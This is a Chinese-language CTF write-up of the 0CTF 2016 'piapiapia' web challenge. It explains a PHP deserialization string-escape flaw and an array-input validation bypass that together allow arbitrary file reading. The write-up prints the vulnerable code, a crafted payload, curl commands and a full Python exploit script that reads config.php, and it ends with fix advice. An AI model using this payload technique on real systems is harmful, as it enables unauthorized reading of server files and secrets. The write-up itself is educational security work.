---
title: "[0CTF 2016]piapiapia"
date: 2025-05-30T15:00:00+08:00
draft: false
tags: ["ctf", "php", "反序列化", "web安全"]
categories: ["Writeup"]
---

## 题目信息

- **类型**：Web / PHP 反序列化
- **核心漏洞**：反序列化字符串逃逸 + 任意文件读取
- **源码泄露**：`www.zip`

---

## 源码结构

下载源码后得到以下关键文件：

| 文件 | 作用 |
|------|------|
| `index.php` | 登录页面 |
| `register.php` | 注册页面 |
| `update.php` | 更新个人信息（文件上传 + 数据入库） |
| `profile.php` | 展示个人信息（触发文件读取） |
| `class.php` | 核心类（user + mysql） |
| `config.php` | 配置文件（含 flag） |

---

## 漏洞分析

### 1. 任意文件读取（核心利用点）

`profile.php` 第 16 行：

```php
$profile = unserialize($profile);
$photo = base64_encode(file_get_contents($profile['photo']));
```

`$profile` 是从数据库读取的序列化字符串，经过 `unserialize()` 后得到数组。`$profile['photo']` 作为文件路径传入 `file_get_contents()`，结果被 base64 编码输出到页面。

**如果能控制 `$profile['photo']` 的值，就能读取服务器上的任意文件。**

### 2. 反序列化字符串逃逸

#### 2.1 filter() 函数

`class.php` 中的 `filter()`：

```php
public function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
```

关键点：
- `where`（5 字符）被替换为 `hacker`（6 字符）
- **每出现一次 `where`，替换后长度 +1**
- 替换是在**整个序列化字符串**上进行的

#### 2.2 update.php 的序列化流程

```php
$profile['phone'] = $_POST['phone'];
$profile['email'] = $_POST['email'];
$profile['nickname'] = $_POST['nickname'];
$profile['photo'] = 'upload/' . md5($file['name']);

$user->update_profile($username, serialize($profile));
```

`serialize($profile)` 生成的字符串会经过 `filter()` 再存入数据库。

如果能在 `$profile` 的某个字段中注入大量 `where`，替换后序列化字符串的长度就会发生变化，导致 **声明的长度与实际长度不匹配**，从而"吞掉"后面的字段。

### 3. nickname[] 数组绕过长度限制

`update.php` 对 nickname 的限制：

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
```

正常情况下：
- 长度不能超过 10
- 只能包含字母、数字、下划线

**绕过方法：将 `nickname` 提交为数组**

发送 `nickname[]=<payload>`，PHP 会解析为 `$_POST['nickname'] = array(0 => <payload>)`。

此时：
- `preg_match('/.../', array())` → 返回 `false`，发出 Warning 但不会 die
- `strlen(array())` → 返回 `NULL`，`NULL > 10` 为 `false`

**成功绕过长度和字符限制。**

---

## Payload 构造

### 目标

让反序列化后的数组中，`photo` 字段指向目标文件（如 `config.php`）。

### 原始序列化结构

```
a:4:{s:5:"phone";s:11:"13800138000";s:5:"email";s:5:"a@b.c";s:8:"nickname";a:1:{i:0;s:204:"PAYLOAD";}s:5:"photo";s:39:"upload/xxxxxx";}
```

### 构造方法

1. **确定注入内容**：
   ```
   ";}s:5:"photo";s:10:"config.php";}
   ```
   - `";` — 结束字符串
   - `}` — 结束 nickname 数组
   - `s:5:"photo";s:10:"config.php";}` — 在外层数组注入新的 `photo` 字段

2. **计算长度**：
   注入内容长度 = 34

3. **计算 where 数量**：
   每个 `where` 替换为 `hacker`，长度 +1。需要 34 个 `where` 来产生 34 的长度差。

4. **最终 payload**：
   ```
   where * 34 + ";}s:5:"photo";s:10:"config.php";}
   ```

### 替换后的效果

原始 nickname 值长度声明为 204，实际值经过 filter 后：
- 前 204 个字符变成 34 个 `hacker`
- 后面紧跟 `";}s:5:"photo";s:10:"config.php";}`

PHP 反序列化时：
1. 读取 204 个字符作为字符串值
2. 遇到 `";}` — 字符串结束，数组结束
3. 遇到 `s:5:"photo"` — 解析为外层数组的新字段
4. `config.php` 成为 `photo` 的值
5. 外层数组原始 `photo` 字段被忽略

---

## 利用步骤

### 1. 注册并登录

```bash
curl -X POST -d "username=hack&password=hack" http://target/register.php
curl -X POST -d "username=hack&password=hack" http://target/index.php
```

### 2. 提交 Payload

```bash
curl -X POST \
  -F "phone=13800138000" \
  -F "email=a@b.c" \
  -F "nickname[]=where...where\";}s:5:\"photo\";s:10:\"config.php\";}" \
  -F "photo=@a.jpg" \
  http://target/update.php
```

> 注意：文件需大于 5 字节（`update.php` 限制）

### 3. 读取结果

访问 `profile.php`，页面中的 `<img>` 标签的 `src` 属性包含 base64 编码的文件内容：

```html
<img src="data:image/gif;base64,PD9waHA...">
```

提取 base64 并解码即可得到文件内容。

---

## 关键代码

```python
import requests
import re
import base64

URL = "http://target"
s = requests.Session()

# 注册登录
s.post(f"{URL}/register.php", data={"username": "hack", "password": "hack"})
s.post(f"{URL}/index.php", data={"username": "hack", "password": "hack"})

# 构造 payload
inject = '";}s:5:"photo";s:10:"config.php";}'
where_count = len(inject)  # 34
payload = 'where' * where_count + inject

# 提交 update
files = {'photo': ('a.jpg', b'aaaaaa', 'image/jpeg')}
data = {
    'phone': '13800138000',
    'email': 'a@b.c',
    'nickname[]': payload
}
s.post(f"{URL}/update.php", data=data, files=files)

# 获取结果
r = s.get(f"{URL}/profile.php")
m = re.search(r'data:image/gif;base64,([^"\'\s<>]+)', r.text)
if m:
    content = base64.b64decode(m.group(1))
    print(content.decode('utf-8'))
```

---

## 漏洞修复建议

1. **修复反序列化逃逸**：不要在序列化字符串上进行关键词替换，应先对输入值过滤，再序列化
2. **严格限制 nickname**：强制校验 `nickname` 为字符串，拒绝数组输入
3. **使用 PDO + 预处理语句**：防止 SQL 注入（虽然本题中 SQL 注入被过滤，但 `mysql_*` 函数已废弃）
4. **文件上传校验**：限制文件扩展名、MIME 类型，使用随机文件名
5. **移除源码泄露**：删除 `www.zip` 等打包文件

---

## 总结

本题是一道经典的 **PHP 反序列化字符串逃逸** CTF 题目。核心利用链：

1. `nickname[]` 数组绕过长度和字符限制
2. `filter()` 中 `where` → `hacker` 产生长度差
3. 长度差导致反序列化时"吞掉"后续字段
4. 注入新的 `photo` 字段控制 `file_get_contents()` 的参数
5. 读取 `config.php` 获取 flag
